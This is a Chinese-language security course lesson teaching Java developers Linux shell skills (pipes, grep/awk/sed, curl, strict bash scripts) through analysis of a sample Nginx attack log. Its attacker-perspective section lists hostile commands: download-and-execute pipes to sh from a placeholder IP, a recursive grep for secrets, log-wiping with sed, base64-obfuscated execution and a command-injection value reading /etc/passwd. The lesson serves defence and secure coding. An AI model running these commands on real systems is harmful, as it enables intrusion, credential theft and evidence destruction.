## 为什么要学

作为 Java 后端，你肯定用过 `tail -f` 看日志、`grep` 搜异常。但做安全以后，Shell 的地位会明显上升：应急响应时你面对的是一台陌生服务器和几个 GB 的 Nginx 日志，没有 IDE、没有 ELK，只有一个终端。能不能在五分钟内回答“攻击从哪个 IP 来、打了哪些接口、成功了没有”，靠的就是管道和 `grep`/`awk`/`sed`。

Shell 也是攻击者的主战场：命令注入最终执行的是 Shell 命令，反弹 Shell 是一条 `bash` 管道，挖矿木马的持久化是一段 `curl ... | sh`。看不懂这些命令，你就读不懂攻击日志，也写不出命令注入的修复（见 [[web-rce]]）。

这一课是 Linux 阶段的第一课，后面的 [[linux-process]]、[[linux-perm]]、[[linux-net]] 都默认你已经熟悉这里的基本功。学完后你应该能：用一行管道统计日志、写一个出错就停下的安全脚本、用 `curl` 精确构造任意 HTTP 请求。

:::tip 环境说明
下面的命令在 macOS 终端和 Linux 上都能运行。macOS 自带的是 BSD 版 `sed`/`grep`/`awk`，与 Linux 的 GNU 版在少数参数上有差异，遇到时会特别说明。
:::

## 核心概念

### 1. 管道、重定向、环境变量、退出码

**三个标准流**：每个进程启动时都有 0 号 stdin（标准输入）、1 号 stdout（标准输出）、2 号 stderr（标准错误）三个文件描述符。Java 里的 `System.in`/`System.out`/`System.err` 就是它们。

**管道 `|`**：把左边命令的 stdout 接到右边命令的 stdin，两个命令同时运行。Unix 哲学是“每个工具只做一件事，用管道组合”：

```
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
   read file      take column 1    sort   count    by count   top 10
```

**重定向**：

| 写法 | 含义 |
|---|---|
| `cmd > out.txt` | stdout 覆盖写入文件 |
| `cmd >> out.txt` | stdout 追加写入文件 |
| `cmd 2> err.txt` | stderr 写入文件 |
| `cmd > all.txt 2>&1` | stdout 写文件，再让 stderr 指向 stdout 当前指向的地方（顺序很重要） |
| `cmd &> all.txt` | bash 简写，等价于上一行 |
| `cmd < in.txt` | 从文件读 stdin |
| `cmd 2>/dev/null` | 丢弃错误输出 |
| `cmd <<'EOF' ... EOF` | Here Document，多行输入；分隔符加引号时不展开 `$` 变量 |

一个常见坑：`cmd 2>&1 > file` 和 `cmd > file 2>&1` 不一样。前者先让 stderr 指向当时的 stdout（终端），再把 stdout 改到文件，结果错误信息仍然打在屏幕上。

**环境变量**：进程的一组 `KEY=VALUE`，会被子进程**继承**（Spring Boot 读取 `SPRING_PROFILES_ACTIVE`、`JAVA_HOME` 都靠它）。普通 Shell 变量只有 `export` 后才会传给子进程：

```
$ X=1; bash -c 'echo "child sees: [$X]"'
child sees: []
$ export X; bash -c 'echo "child sees: [$X]"'
child sees: [1]
```

常用：`env`（列出全部）、`echo "$PATH"`、`export KEY=val`、`KEY=val cmd`（只对这一条命令生效）。安全提醒：环境变量对同一用户的其他进程并不是秘密，在 Linux 上可以通过 `/proc/<pid>/environ` 读到（见 [[linux-process]]），所以把数据库密码放进环境变量只是“比写在命令行里好”，不是真正的保密。

**退出码**：每个命令结束时返回一个 0 到 255 的整数，`$?` 保存上一条命令的退出码。**0 表示成功，非 0 表示失败**（和 Java 里 `System.exit(1)` 一致）：

```
$ ls /nope; echo $?
ls: /nope: No such file or directory
1
$ grep -q zzz /etc/hosts; echo $?
1
```

`grep` 的约定是：0 = 找到了，1 = 没找到，2 = 出错。`&&` 表示“前一条成功才执行”，`||` 表示“前一条失败才执行”：`./mvnw test && echo OK || echo FAIL`。

管道的退出码默认是**最后一个命令**的退出码，前面的失败会被吞掉：

```
$ false | true; echo $?
0
$ set -o pipefail; false | true; echo $?
1
```

这就是后面脚本里要加 `pipefail` 的原因。

### 2. grep、awk、sed

先准备一份样例日志，后面的例子和实践都用它。把下面内容保存为 `~/lab/shell/access.log`（Nginx 默认的 combined 格式）：

```
203.0.113.10 - - [24/Sep/2026:10:00:01 +0800] "GET /api/orders HTTP/1.1" 200 512 "-" "Mozilla/5.0"
203.0.113.10 - - [24/Sep/2026:10:00:02 +0800] "GET /api/orders/42 HTTP/1.1" 200 256 "-" "Mozilla/5.0"
198.51.100.7 - - [24/Sep/2026:10:00:03 +0800] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.31"
198.51.100.7 - - [24/Sep/2026:10:00:03 +0800] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.31"
198.51.100.7 - - [24/Sep/2026:10:00:04 +0800] "POST /api/login HTTP/1.1" 401 64 "-" "python-requests/2.31"
198.51.100.7 - - [24/Sep/2026:10:00:04 +0800] "POST /api/login HTTP/1.1" 200 128 "-" "python-requests/2.31"
192.0.2.55 - - [24/Sep/2026:10:00:05 +0800] "GET /api/products?id=1%27%20OR%201=1-- HTTP/1.1" 500 0 "-" "sqlmap/1.8"
192.0.2.55 - - [24/Sep/2026:10:00:06 +0800] "GET /.env HTTP/1.1" 404 153 "-" "sqlmap/1.8"
192.0.2.55 - - [24/Sep/2026:10:00:06 +0800] "GET /actuator/env HTTP/1.1" 404 153 "-" "sqlmap/1.8"
203.0.113.10 - - [24/Sep/2026:10:00:07 +0800] "GET /static/app.js HTTP/1.1" 304 0 "-" "Mozilla/5.0"
10.0.0.8 - - [24/Sep/2026:10:00:08 +0800] "GET /actuator/health HTTP/1.1" 200 15 "-" "kube-probe/1.30"
203.0.113.10 - - [24/Sep/2026:10:00:09 +0800] "GET /api/cart HTTP/1.1" 200 300 "-" "Mozilla/5.0"
```

按空格切分后，各列是：`$1` 客户端 IP，`$4` 时间，`$6` 方法（带一个引号），`$7` 路径，`$9` 状态码，`$10` 响应字节数。

#### grep：按行过滤

| 参数 | 作用 | 例子 |
|---|---|---|
| `-n` | 显示行号 | `grep -n login access.log` |
| `-r` | 递归搜索目录 | `grep -rn 'server.address' src/` |
| `-E` | 扩展正则（`+`、`?`、`()`、`{n}`、或运算无需转义） | `grep -E '" 40[0-9] ' access.log` |
| `-v` | 反向，输出**不**匹配的行 | `grep -v ' 200 ' access.log` |
| `-i` | 忽略大小写 | `grep -i 'select' access.log` |
| `-c` | 只输出匹配行数 | `grep -c ' 401 ' access.log` → `3` |
| `-o` | 只输出匹配到的部分 | `grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' access.log` |
| `--include` | 递归时只搜某类文件 | `grep -rn --include='*.properties' password .` |

找出扫描器的请求：

```
$ grep -nE '(\.env|actuator|%27)' access.log
7:192.0.2.55 - - [24/Sep/2026:10:00:05 +0800] "GET /api/products?id=1%27%20OR%201=1-- HTTP/1.1" 500 0 "-" "sqlmap/1.8"
8:192.0.2.55 - - [24/Sep/2026:10:00:06 +0800] "GET /.env HTTP/1.1" 404 153 "-" "sqlmap/1.8"
9:192.0.2.55 - - [24/Sep/2026:10:00:06 +0800] "GET /actuator/env HTTP/1.1" 404 153 "-" "sqlmap/1.8"
11:10.0.0.8 - - [24/Sep/2026:10:00:08 +0800] "GET /actuator/health HTTP/1.1" 200 15 "-" "kube-probe/1.30"
```

第 11 行是 K8s 健康检查，属于误报，说明 grep 只是初筛，结果需要人去读。`%27` 是 URL 编码的单引号，是 SQL 注入探测的典型特征（见 [[web-sqli]]）。

#### awk：按列处理

awk 把每一行按空白切成字段 `$1`、`$2`……（`$0` 是整行，`NF` 是字段数，`NR` 是当前行号），对每一行执行 `条件 { 动作 }`。它本质上是一门小语言，有变量、关联数组（类似 Java 的 `Map`）、`BEGIN`/`END` 块。

```
$ awk '{print $1, $9}' access.log | head -3          # 只看 IP 和状态码
203.0.113.10 200
203.0.113.10 200
198.51.100.7 401

$ awk '$9 >= 500' access.log                        # 条件过滤：服务端错误
192.0.2.55 - - [24/Sep/2026:10:00:05 +0800] "GET /api/products?id=1%27%20OR%201=1-- HTTP/1.1" 500 0 "-" "sqlmap/1.8"

$ awk '$9 == 401 {print $1}' access.log | sort | uniq -c   # 谁在登录失败
   3 198.51.100.7

$ awk '{sum += $10} END {print sum, sum/NR}' access.log    # 总字节数和平均值
1709 142.417
```

`-F` 指定分隔符。combined 日志里 User-Agent 含空格，按空格切不准，可以按双引号切，第 6 段就是 UA：

```
$ awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn
   4 python-requests/2.31
   4 Mozilla/5.0
   3 sqlmap/1.8
   1 kube-probe/1.30
```

一眼就能看出 `sqlmap` 和脚本化的 `python-requests` 流量。

#### sed：流式替换

sed 逐行读入、按规则修改、输出。最常用的是替换 `s/正则/替换/标志`：

```
$ sed -E 's/^([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+/\1.xxx/' access.log | head -2    # IP 脱敏
203.0.113.xxx - - [24/Sep/2026:10:00:01 +0800] "GET /api/orders HTTP/1.1" 200 512 "-" "Mozilla/5.0"
203.0.113.xxx - - [24/Sep/2026:10:00:02 +0800] "GET /api/orders/42 HTTP/1.1" 200 256 "-" "Mozilla/5.0"

$ sed -n '2,3p' access.log                 # 只打印第 2 到 3 行（-n 关闭默认输出，p 打印）
$ sed '/kube-probe/d' access.log           # 删除健康检查行
```

- `g` 标志：一行内全部替换，否则只替换第一个匹配。
- `-E`：扩展正则，分组 `()` 不用写成 `\(\)`。
- `-i`：**直接修改文件**。GNU sed 写 `sed -i 's/a/b/' f`；macOS 的 BSD sed 必须带一个备份后缀参数，写 `sed -i '' 's/a/b/' f`。改配置文件前先不加 `-i` 预览输出，确认无误再加。

例如批量把配置里的密码打码后再发给同事：`sed -i '' 's/^db.password=.*/db.password=******/' app.properties`。

### 3. curl / wget 常用参数

`curl` 是安全工作里最常用的 HTTP 客户端：复现漏洞、验证修复、写 PoC 都离不开它。以下例子针对本项目的实验接口（先 `./mvnw spring-boot:run` 启动应用）。

| 参数 | 作用 | 例子 |
|---|---|---|
| `-v` | 显示请求头、响应头、TLS 握手等详细过程 | `curl -v http://127.0.0.1:8080/` |
| `-H` | 添加/覆盖请求头 | `-H 'X-User-Id: 1'` |
| `-X` | 指定方法 | `-X DELETE`、`-X PUT` |
| `-d` | 发送请求体（默认按表单 `application/x-www-form-urlencoded`，并隐含 POST） | `-d 'title=hi&content=x'` |
| `--data-urlencode` | 对值做 URL 编码后发送 | `--data-urlencode "keyword=a' OR '1'='1"` |
| `-G` | 把 `-d` 的数据改为拼到 URL 查询串里，用 GET 发送 | 配合 `--data-urlencode` |
| `-i` / `-I` | 输出里包含响应头 / 只发 HEAD 请求看头 | `curl -I https://example.com` |
| `-s` / `-o` | 静默 / 把响应体写到文件 | `-s -o /dev/null` |
| `-w` | 按格式输出统计信息 | `-w '%{http_code} %{time_total}\n'` |
| `-L` | 跟随重定向 | |
| `-x` | 走代理（比如 Burp 的 `http://127.0.0.1:8080`） | `-x http://127.0.0.1:8081` |
| `-k` | **跳过 TLS 证书校验** | 见下文 |

组合起来：用 `-G` + `--data-urlencode` 发一个带 SQL 注入 payload 的 GET 请求到 Lab 01 的修复版接口，并只看状态码：

```
$ curl -s -o /dev/null -w '%{http_code}\n' -G -H 'X-User-Id: 1' \
    --data-urlencode "keyword=' OR '1'='1" \
    http://127.0.0.1:8080/secure/l01/notes/search
200
```

`-v` 的输出里，`>` 开头的是**发出去的请求**，`<` 开头的是**收到的响应**，`*` 开头的是 curl 自己的连接信息：

```
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
> POST /vuln/l02/notes HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.7.1
> Accept: */*
> X-User-Id: 1
> Content-Length: 19
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200
< Content-Length: 0
< Date: ...
<
```

这是 `curl -v -H 'X-User-Id: 1' -d 'title=hi&content=x' http://127.0.0.1:8080/vuln/l02/notes` 的输出形态：你能确认 `-d` 自动把方法变成了 POST，并加上了表单的 `Content-Type`。

**`wget`** 更偏向“下载文件”：`wget https://example.com/app.tar.gz`、`wget -O out.html URL`、`wget -q -O- URL`（输出到 stdout）。在入侵痕迹里常见 `wget http://x.x.x.x/a.sh -O /tmp/a.sh` 或 `curl -fsSL http://.../x.sh | sh` 这类下载执行的命令，看到要高度警惕。

**`-k` 为什么危险**：`-k`（`--insecure`）让 curl 不再校验服务器证书是否可信、域名是否匹配。这等于放弃了 TLS 防中间人的核心能力：连接仍然是加密的，但你不知道自己在和谁加密通信，攻击者可以用自签证书冒充服务器，看到并篡改全部内容。它在内网调试自签证书时很方便，于是经常被复制进部署脚本、健康检查、CI 流水线，最后变成生产配置。Java 里对应的反模式是自定义一个“信任所有证书”的 `X509TrustManager` 或关闭 `HostnameVerifier`。正确做法是用 `--cacert ca.pem` 指定你信任的 CA（详见 [[net-tls]]）。

### 4. 写一个带 set -euo pipefail 的小脚本

Bash 的默认行为非常“宽容”：命令失败了继续往下跑，变量没定义就当空字符串。在运维脚本里这是灾难的来源。经典例子：

```bash
cd "$DEPLOY_DIR"      # 如果变量拼错或 cd 失败……
rm -rf ./*            # ……就会在当前目录（可能是 / 或 $HOME）执行删除
```

脚本开头加上这一行，让 Bash 变得“严格”：

| 选项 | 效果 |
|---|---|
| `set -e` | 任何命令返回非 0 时立即退出脚本（`if`/`&&`/`||` 条件里的命令除外） |
| `set -u` | 引用未定义的变量时报错退出，而不是当成空字符串 |
| `set -o pipefail` | 管道中任何一个命令失败，整个管道就算失败（默认只看最后一个） |

```
$ bash -c 'set -u; echo "$UNDEFINED_VAR"'; echo "exit=$?"
bash: UNDEFINED_VAR: unbound variable
exit=127
```

下面是一个完整的日志统计脚本 `logtop.sh`，演示严格模式和几个好习惯：

```bash
#!/usr/bin/env bash
# 用法：./logtop.sh <access.log> [N]
# 输出状态码分布和请求最多的前 N 个 IP
set -euo pipefail

usage() { echo "usage: $0 <access.log> [N]" >&2; exit 2; }

[[ $# -ge 1 ]] || usage
log="$1"
n="${2:-10}"                               # 第二个参数可选，默认 10

[[ -r "$log" ]] || { echo "cannot read: $log" >&2; exit 1; }
[[ "$n" =~ ^[0-9]+$ ]] || { echo "N must be a number: $n" >&2; exit 2; }

echo "== status codes =="
awk '{c[$9]++} END {for (s in c) print s, c[s]}' "$log" | sort

echo "== top $n IPs =="
awk '{print $1}' "$log" | sort | uniq -c | sort -rn | head -n "$n"
```

运行：

```
$ chmod +x logtop.sh
$ ./logtop.sh access.log 3; echo "exit=$?"
== status codes ==
200 5
304 1
401 3
404 2
500 1
== top 3 IPs ==
   4 203.0.113.10
   4 198.51.100.7
   3 192.0.2.55
exit=0
$ ./logtop.sh nope.log; echo "exit=$?"
cannot read: nope.log
exit=1
$ ./logtop.sh; echo "exit=$?"
usage: ./logtop.sh <access.log> [N]
exit=2
```

几个要点：

- **变量一律加双引号**：`"$log"`。不加引号时，文件名里的空格会被拆成多个参数，`*` 会被展开成文件列表。这也是命令注入的温床。
- **校验输入**：`N` 必须是数字，否则 `head -n "abc"` 会以奇怪的方式失败；来自外部的参数要当成不可信输入。
- **错误信息写 stderr**（`>&2`），用不同的退出码区分“用法错误”和“运行失败”，方便被其他脚本或 CI 调用。
- `${2:-10}` 是“未设置或为空时取默认值”，可以和 `set -u` 和平共处。
- 一个已知的坑：开启 `pipefail` 后，`... | head` 在输入很大时可能因为 `head` 提前关闭管道、上游收到 SIGPIPE 而返回非 0（通常是 141）。遇到时可以针对那一条命令单独处理，而不是关掉严格模式。
- `set -e` 不是万能的：在 `if` 条件、`&&`/`||` 链、函数被当作条件调用时，它不会生效。关键步骤仍然要显式检查。

## 动手实践

### 实践 1：完成 OverTheWire Bandit 前 15 关

Bandit 是一个在线 Linux 闯关游戏：每一关用 SSH 登录一个用户，找到下一关用户的密码。它专门训练本课和 [[linux-perm]] 的基本功。连接方式：

```
$ ssh bandit0@bandit.labs.overthewire.org -p 2220
```

第 0 关的密码是 `bandit0`（官网写明）。之后每关的目标和提示都在官网对应关卡页面上，**以官网当前说明为准**。下面只列每关训练的技能和思路提示，不给答案，卡住时再看：

| 关卡 | 训练的技能 | 提示 |
|---|---|---|
| 0 | `ssh` 登录 | 注意端口是 2220，不是 22 |
| 0→1 | `ls`、`cat` | 家目录里有什么文件？ |
| 1→2 | 特殊文件名 | 文件名是 `-` 时，`cat -` 会读 stdin；试试加上路径前缀 `./` |
| 2→3 | 文件名含空格 | 用引号或 Tab 自动补全 |
| 3→4 | 隐藏文件 | `ls -a` |
| 4→5 | 判断文件类型 | `file ./*`，找人类可读的那一个 |
| 5→6 | 按属性找文件 | `find` 的 `-size`、`-type`、`! -executable` |
| 6→7 | 全盘搜索 + 丢弃错误 | `find / -user ... -group ... 2>/dev/null` |
| 7→8 | 按关键词找行 | `grep` |
| 8→9 | 找只出现一次的行 | `sort` 后再 `uniq -u`（uniq 只比较相邻行） |
| 9→10 | 二进制文件里找字符串 | `strings` 配合 `grep` |
| 10→11 | Base64 | `base64 -d` |
| 11→12 | 字母替换（ROT13） | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| 12→13 | 反复解压 | `xxd -r` 还原十六进制转储，用 `file` 判断每一层是什么压缩格式；先在 `/tmp` 下建自己的目录再操作 |
| 13→14 | SSH 私钥登录 | `ssh -i`，注意私钥文件权限必须收紧（呼应 [[linux-perm]]） |
| 14→15 | 向端口发送数据 | `nc localhost <端口>` 连上后输入当前关的密码 |

完成标准：每一关都能说清“我用了什么命令、为什么这样用”。建议建一个笔记记录每关的命令，这会成为你自己的速查表。

:::tip 读法
Bandit 的每一关都对应真实场景：`find / -perm`、`2>/dev/null` 在提权枚举里天天用；`strings` 用来从二进制和内存转储里找密钥；`base64 -d` 用来还原攻击者的混淆命令；私钥权限问题你在服务器上也一定会遇到。
:::

### 实践 2：用 awk 统计 access.log 的状态码分布

使用前面准备的 `~/lab/shell/access.log`（也可以换成你公司测试环境导出的 Nginx 日志，记得先脱敏）。

第一步，最简单的计数：

```
$ awk '{c[$9]++} END {for (s in c) print s, c[s]}' access.log | sort
200 5
304 1
401 3
404 2
500 1
```

读法：`c[$9]++` 以状态码为 key 做计数（相当于 Java 的 `map.merge(status, 1, Integer::sum)`）；`END` 块在读完所有行后执行，遍历数组输出。awk 遍历数组的顺序不确定，所以接一个 `sort`。

第二步，按类别汇总并计算占比：

```
$ awk '{c[substr($9,1,1) "xx"]++} END {for (k in c) printf "%s %d %.1f%%\n", k, c[k], c[k]*100/NR}' access.log | sort
2xx 5 41.7%
3xx 1 8.3%
4xx 5 41.7%
5xx 1 8.3%
```

读法：`substr($9,1,1)` 取状态码第一位；`NR` 在 `END` 里等于总行数。从安全角度看这份数据：

- **4xx 占比 41.7%** 在正常业务里偏高，值得往下挖：是 401（认证失败，可能是撞库/爆破）还是 404（扫描器在找 `.env`、`actuator` 等敏感路径）？
- **出现 500** 的那条正好带着 SQL 注入 payload，说明输入可能进入了 SQL 并导致报错，这是需要立即排查的信号。

第三步，把“谁在制造 4xx”也列出来：

```
$ awk '$9 ~ /^4/ {print $1, $9}' access.log | sort | uniq -c | sort -rn
   3 198.51.100.7 401
   2 192.0.2.55 404
```

`198.51.100.7` 连续 3 次 401 后紧接着一次 200，是典型的“爆破成功”模式，应该检查这个账号。

### 问题：如何用一行命令统计 Nginx 访问日志里请求最多的前 10 个 IP？

```
$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10
   4 203.0.113.10
   4 198.51.100.7
   3 192.0.2.55
   1 10.0.0.8
```

逐段解释：`awk '{print $1}'` 取第一列 IP；`sort` 让相同 IP 相邻（`uniq` 只合并**相邻**的重复行，这一步不能省）；`uniq -c` 计数；`sort -rn` 按数字倒序；`head -10` 取前 10。

几个变体：

- 纯 awk 版本，不依赖排序后去重：`awk '{c[$1]++} END {for (ip in c) print c[ip], ip}' access.log | sort -rn | head -10`
- 日志已经轮转并压缩：`zcat access.log.*.gz | awk '{print $1}' | sort | uniq -c | sort -rn | head -10`（macOS 上用 `gzcat`）
- 前面还有 CDN/SLB，第一列都是代理 IP：要改用 `log_format` 中记录的真实 IP 字段，并注意 [[net-infra]] 里讲的 XFF 伪造问题。

## 攻击者视角

> 以下内容只用于理解攻击和在自己的环境中练习，不要对未授权的目标使用。

攻击者拿到命令执行能力（比如通过命令注入或反序列化 RCE）后，第一件事几乎都是一串 Shell 命令：

- **信息收集**：`id; uname -a; cat /etc/os-release; env; ps aux; ls -la ~`，其中 `env` 可能直接暴露数据库密码、云 AK/SK、JWT 密钥。
- **找敏感文件**：`grep -rniE 'password|secret|accesskey' / --include='*.properties' --include='*.yml' 2>/dev/null`，这和你排查配置用的是同一条命令。
- **下载执行**：`curl -fsSL http://x.x.x.x/i.sh | sh` 或 `wget -q -O- ... | bash`，挖矿木马最常见的入口。
- **反弹 Shell**：利用重定向把一个交互式 Shell 的输入输出都接到攻击者的 TCP 连接上（例如 bash 的 `/dev/tcp` 特性），从而穿透 NAT 主动连出去。
- **清理痕迹**：`sed -i '/攻击者IP/d' access.log`、`history -c`、`unset HISTFILE`，用的正是你刚学会的 sed。
- **混淆绕过**：`echo Y3VybCAuLi4= | base64 -d | sh`，把命令编码后执行，躲过简单的关键词检测。

命令注入的根源也在 Shell：Java 里写 `Runtime.getRuntime().exec(new String[]{"sh", "-c", "ping -c 1 " + host})`，用户传入 `127.0.0.1; cat /etc/passwd`，`;` 就会让 Shell 执行第二条命令。`|`、`&&`、`$( )`、反引号、换行符都能达到同样效果。

## 防御与最佳实践

- **Java 里不要拼 Shell 命令**：用 `ProcessBuilder` 的参数数组形式，不经过 `sh -c`，参数就不会被 Shell 解释；再对参数做白名单校验。更好的是用 Java 库完成同样的事情（比如用 `InetAddress.isReachable` 代替调用 `ping`，注意它没有权限发 ICMP 时会改用 TCP 探测，行为不完全等同）。详见 [[web-rce]]。

```java
// 危险：经过 sh -c，host 里的 ; | $( ) 都会被解释
new ProcessBuilder("sh", "-c", "ping -c 1 " + host).start();

// 较安全：不经过 Shell，host 只是 ping 的一个参数；同时做白名单校验
if (!host.matches("^[a-zA-Z0-9.-]{1,253}$")) throw new IllegalArgumentException("bad host");
new ProcessBuilder("ping", "-c", "1", "--", host).start();
```

- **脚本严格模式**：`set -euo pipefail`，变量加双引号，外部输入先校验。
- **不在命令行和脚本里写明文密码**：命令行参数会出现在 `ps` 和 Shell 历史里；用配置文件（收紧权限）或密钥管理服务。
- **不要在生产脚本里用 `curl -k`**，也不要 `curl ... | sh` 安装来路不明的脚本；先下载、看内容、校验哈希再执行。
- **日志保护**：访问日志和 Shell 历史要实时转发到集中日志系统，攻击者在本机用 sed 删日志就无法抹掉已经发出去的副本。
- **检测**：对进程命令行中出现的 `curl|sh`、`wget -O-`、`base64 -d | sh`、`/dev/tcp/` 等模式告警；主机安全产品和审计规则（如 auditd 记录 execve）就是做这个的。

## 常见误区

- **“`$?` 为 0 说明管道每一步都成功”**：默认只反映最后一个命令，需要 `pipefail` 或 `${PIPESTATUS[@]}`。
- **“`uniq` 能直接去重统计”**：它只合并相邻的相同行，不先 `sort` 结果就是错的。
- **“`sed -i` 在 Mac 和 Linux 上一样”**：BSD sed 需要 `-i ''`，同一脚本跨平台时要注意；改文件前先预览。
- **“`curl -k` 只是跳过一个警告”**：它关闭的是证书身份校验，等于允许中间人。
- **“环境变量是安全的密码存放处”**：同用户的进程和 root 都能读到 `/proc/<pid>/environ`，只是比命令行参数好一些。
- **“`set -e` 能兜住所有错误”**：条件语句和 `&&`/`||` 中的失败不会触发退出。
- **“按空格切 awk 字段永远准确”**：日志中 User-Agent、请求路径可能包含空格或被攻击者故意构造，关键分析要用确定的分隔符或结构化日志（JSON）。

## 自测

:::details 1. `cmd > out.log 2>&1` 和 `cmd 2>&1 > out.log` 有什么区别？
重定向从左到右处理。前者先把 stdout 指向文件，再让 stderr 复制 stdout 的当前指向，两者都进文件。后者先让 stderr 指向当时的 stdout（终端），再把 stdout 改到文件，所以错误信息仍然显示在终端上。
:::

:::details 2. 为什么 `X=1; bash -c 'echo $X'` 输出空？怎么修？
`X=1` 只是当前 Shell 的普通变量，不会传给子进程。用 `export X=1`，或者 `X=1 bash -c 'echo $X'` 只对这条命令设置环境变量。注意单引号保证 `$X` 由子 Shell 展开。
:::

:::details 3. 写一条命令，找出 access.log 中所有返回 500 的请求路径，并按出现次数排序。
`awk '$9 == 500 {print $7}' access.log | sort | uniq -c | sort -rn`。`$7` 是请求路径，`$9` 是状态码。
:::

:::details 4. `set -euo pipefail` 分别解决了什么问题？
`-e`：命令失败后立刻退出，避免在错误状态下继续执行（比如 cd 失败后在错误目录执行 rm）。`-u`：使用未定义变量时报错，避免拼写错误导致变量为空。`pipefail`：管道中间命令失败时整个管道返回失败，避免错误被最后一个命令吞掉。
:::

:::details 5. `curl -k` 为什么危险？调试自签证书时正确的做法是什么？
`-k` 跳过证书链和域名校验，连接虽然加密，但无法确认对方身份，中间人可以用任意证书冒充服务器、读取和篡改流量。正确做法是 `curl --cacert ca.pem https://...`，显式信任你自己的 CA；Java 里对应的是把 CA 导入 truststore，而不是信任所有证书。
:::

:::details 6. Java 代码 `Runtime.getRuntime().exec(new String[]{"sh","-c","ping -c 1 " + host})` 有什么问题？怎么改？
经过 `sh -c` 后，Shell 会解释 host 中的 `;`、`|`、`$( )` 等元字符，攻击者可以注入任意命令。改为 `new ProcessBuilder("ping", "-c", "1", "--", host)` 不经过 Shell，同时对 host 做白名单正则校验；最好直接用 Java API 实现需求，不调用外部命令。
:::

:::details 7. 在日志里看到 `echo Y3VybCAuLi4= | base64 -d | sh`，你会怎么分析？
这是把命令 Base64 编码后解码再交给 sh 执行，用来躲避关键词检测。先在隔离环境里只执行 `echo Y3VybCAuLi4= | base64 -d` 看解码后的明文（千万不要接 `| sh`），再根据内容追查下载地址、落地文件和持久化位置。
:::

## 一句话总结

管道把小工具串成分析流水线，grep 筛行、awk 切列、sed 改字，curl 精确构造请求；写脚本加 `set -euo pipefail`，变量加引号，永远不要让用户输入进入 `sh -c`。
